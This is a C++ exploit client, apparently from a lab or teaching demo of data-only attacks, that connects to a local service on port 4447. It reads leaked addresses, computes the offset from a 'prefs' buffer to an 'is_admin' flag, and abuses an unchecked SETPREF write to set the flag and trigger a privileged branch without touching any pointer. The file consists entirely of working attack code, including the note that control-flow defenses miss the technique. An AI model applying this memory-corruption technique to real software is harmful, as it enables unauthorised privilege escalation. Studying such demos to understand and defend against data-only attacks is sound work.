/*
 * dataonly_attacker.cpp — client for the data-only attack (TCP :4447)
 * ===================================================================
 * Leaks prefs/is_admin, computes the byte offset from prefs to is_admin, and
 * uses the unchecked SETPREF write to flip is_admin to 1 — touching no pointer.
 * TRIGGER then runs the privileged branch.
 */
#include <cstdio>
#include <cstring>
#include <cstdint>
#include <string>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

static int sfd;
static void sendline(const std::string &s) { std::string l = s + "\n"; write(sfd, l.data(), l.size()); }
static std::string recvline() { std::string r; char c; while (read(sfd, &c, 1) == 1 && c != '\n') r += c; return r; }

int main(int argc, char **argv) {
    uint16_t port = (argc > 1) ? (uint16_t)atoi(argv[1]) : 4447;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in sa = {}; sa.sin_family = AF_INET; sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(sfd, (sockaddr *)&sa, sizeof sa) < 0) { perror("connect"); return 1; }

    printf("[ATTACKER] %s\n", recvline().c_str());        // READY

    sendline("INFO");
    uintptr_t prefs = 0, is_admin = 0, hj = 0;
    recvline();                                           // "OK"
    for (std::string l; (l = recvline()) != "END" && !l.empty(); ) {
        char k[64]; unsigned long long v;
        if (sscanf(l.c_str(), "%63s %llx", k, &v) == 2) {
            if      (!strcmp(k, "prefs"))         prefs    = (uintptr_t)v;
            else if (!strcmp(k, "is_admin"))      is_admin = (uintptr_t)v;
            else if (!strcmp(k, "hijack_target")) hj       = (uintptr_t)v;
        }
    }
    long idx = (long)(is_admin - prefs);   // signed: is_admin may sit before prefs
    printf("[ATTACKER] prefs=%#lx is_admin=%#lx  -> prefs[%ld] is the is_admin byte\n",
           prefs, is_admin, idx);
    printf("[ATTACKER] (no pointer touched — control-flow defenses are blind to this)\n");

    sendline("SETPREF " + std::to_string(idx) + " 1");
    printf("[ATTACKER] flip -> %s\n", recvline().c_str());
    sendline("TRIGGER");
    printf("[ATTACKER] TRIGGER -> %s\n", recvline().c_str());
    sendline("QUIT");
    (void)hj;
    return 0;
}
